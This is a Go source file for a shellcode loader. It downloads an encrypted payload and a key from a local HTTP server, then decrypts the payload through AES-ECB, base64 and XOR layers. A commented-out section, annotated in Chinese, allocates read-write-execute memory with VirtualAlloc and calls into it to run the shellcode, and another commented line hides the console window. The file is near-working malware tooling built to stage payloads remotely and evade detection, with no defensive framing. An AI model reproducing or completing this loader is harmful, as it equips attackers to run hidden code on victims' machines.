package main

import (
	"crypto/aes"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
)

var (
	url    = "http://127.0.0.1:8000/1.txt"
	keyUrl = "http://127.0.0.1:8000/key.txt"
)

func main() {
	//win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)

	data := RemoteLoading(url)

	key := RemoteLoading(keyUrl)

	decryptedAESData := AesDecryptByECB(data, key)

	decryptedBase64Data, err := base64.StdEncoding.DecodeString(decryptedAESData)

	if err != nil {
		os.Exit(1)
	}

	buf := XorDecrypt(decryptedBase64Data)
	fmt.Println(buf)

	/*
		// 获取 kernel32.dll 中的 VirtualAlloc 函数
		kernel32, _ := syscall.LoadDLL("kernel32.dll")
		VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

		// 分配内存并写入 shellcode 内容
		allocSize := uintptr(len(buf))
		mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
		if mem == 0 {
			panic("VirtualAlloc failed")
		}
		buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
		copy(buffer, buf)

		// 执行 shellcode
		syscall.Syscall(mem, 0, 0, 0, 0)
	*/
}

func RemoteLoading(url string) string {
	resp, err := http.Get(url)

	if err != nil {
		fmt.Println("request failed", err)
		return "No data"
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			fmt.Println("Closing body failed", err)
		}
	}(resp.Body)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("response reading failed", err)
		return "No data"
	}

	return string(body)
}

func AesDecryptByECB(data, key string) string {
	keyLenMap := map[int]struct{}{16: {}, 24: {}, 32: {}}
	if _, ok := keyLenMap[len(key)]; !ok {
	}

	originByte, _ := base64.StdEncoding.DecodeString(data)

	keyByte := []byte(key)

	block, _ := aes.NewCipher(keyByte)

	blockSize := block.BlockSize()

	decrypted := make([]byte, len(originByte))
	for bs, be := 0, blockSize; bs < len(originByte); bs, be = bs+blockSize, be+blockSize {
		block.Decrypt(decrypted[bs:be], originByte[bs:be])
	}

	return string(PKCS7UNPadding(decrypted))
}

func PKCS7UNPadding(originDataByte []byte) []byte {
	length := len(originDataByte)
	unpadding := int(originDataByte[length-1])
	return originDataByte[:(length - unpadding)]
}

func XorDecrypt(data []byte) []byte {
	key := byte(0x33)
	result := make([]byte, len(data))

	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key
	}

	return result
}
